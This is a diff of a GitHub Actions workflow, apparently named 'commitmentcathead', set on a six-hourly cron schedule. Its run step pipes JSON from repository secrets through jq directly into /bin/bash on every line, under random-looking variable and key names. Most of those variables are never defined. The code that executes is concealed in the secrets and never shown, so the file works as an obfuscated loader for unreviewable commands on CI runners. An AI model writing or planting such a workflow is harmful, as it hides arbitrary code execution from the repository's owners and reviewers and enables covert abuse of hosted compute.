@@ -3,23 +3,25 @@ name: commitmentcathead
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 4/6 * * *'
-
+    - cron: '6 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: commitmentcathead
         env:
-          wr98224: ${{ secrets.wr98224 }}
+          vvnr07657: ${{ secrets.vvnr07657 }}
         run: |
-          echo $wr98224 | jq -r .cmoja19 | /bin/bash
-          echo $ldqb5894 | jq -r .pllt7 | /bin/bash
-          echo $nm2 | jq -r .vw25 | /bin/bash
-          echo $qqm45 | jq -r .c5 | /bin/bash
-          echo $dmwfa613 | jq -r .cccml5659 | /bin/bash
-          echo $ljmu6017 | jq -r .h271 | /bin/bash
-          echo $e630 | jq -r .centi3431 | /bin/bash
+          echo $vvnr07657 | jq -r .sgwm05 | /bin/bash
+          echo $fwu90269 | jq -r .sgbax374 | /bin/bash
+          echo $accx659 | jq -r .ykqh7 | /bin/bash
+          echo $ecboo24396 | jq -r .pbt6 | /bin/bash
+          echo $zbjk7903 | jq -r .jtid0029 | /bin/bash
+          echo $n5502 | jq -r .lsx77215 | /bin/bash
+          echo $vcm11 | jq -r .kevm861 | /bin/bash
+          echo $ipqo2165 | jq -r .wbjlq3 | /bin/bash
+          echo $qckd958 | jq -r .o1 | /bin/bash
+          echo $w0137 | jq -r .hvkc85 | /bin/bash
+          echo $sm99387 | jq -r .fzzy387 | /bin/bash
 
